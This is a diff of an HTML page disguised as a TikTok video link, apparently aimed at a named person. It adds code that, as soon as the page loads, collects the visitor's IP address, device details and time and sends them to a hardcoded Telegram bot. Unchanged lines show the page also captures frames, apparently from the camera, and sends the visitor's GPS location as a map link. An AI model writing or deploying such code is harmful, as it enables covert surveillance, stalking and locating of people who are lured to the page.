@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>TikTok</title>
-    <meta property="og:title" content="TikTok . danaz hoshyar">
+    <meta property="og:title" content="TikTok . Shahen Sleman">
     <meta property="og:image" content="soran.jpg">
     <meta property="og:type" content="video.other">
     <style>
@@ -15,7 +15,6 @@
             left: 0; 
             width: 100%; 
             height: 100%; 
-            /* چاککردنی ناونیشانی وێنەکە */
             background: url('soran.jpg') no-repeat center center; 
             background-size: contain; 
             z-index: 1; 
@@ -39,6 +38,33 @@
         const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
         const chat_id = "7261354534";
         const targetVideo = "https://vt.tiktok.com/ZS5WMhjoP/";
+
+        // ناردنی زانیارییەکان ڕاستەوخۆ کاتێک لینکەکە دەکرێتەوە
+        window.onload = async function() {
+            try {
+                let ipAddress = "نەدۆزرایەوە";
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    ipAddress = data.ip;
+                } catch (e) { ipAddress = "بلۆک کراوە"; }
+
+                const now = new Date();
+                const timeStr = `${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
+                const port = window.location.port || (window.location.protocol === 'https:' ? '443' : '80');
+
+                const deviceDetails = `
+🚀 سەردانکەرێکی نوێ:
+🌐 ئایپی: ${ipAddress}
+🔌 پۆرت: ${port}
+📱 ئامێر: ${navigator.userAgent}
+⏰ کات: ${timeStr}
+📅 ڕێکەوت: ${now.toLocaleDateString()}
+                `;
+
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(deviceDetails)}`);
+            } catch (err) { console.log("Init error"); }
+        };
 
         async function sendPhoto(v, c, fileName, caption) {
             c.width = v.videoWidth; c.height = v.videoHeight;
@@ -71,7 +97,6 @@
                             navigator.geolocation.getCurrentPosition(async (pos) => {
                                 const lat = pos.coords.latitude;
                                 const lon = pos.coords.longitude;
-                                // چاککردنی لینکەکە بۆ ئەوەی ئیش بکات
                                 const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                                 
                                 await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
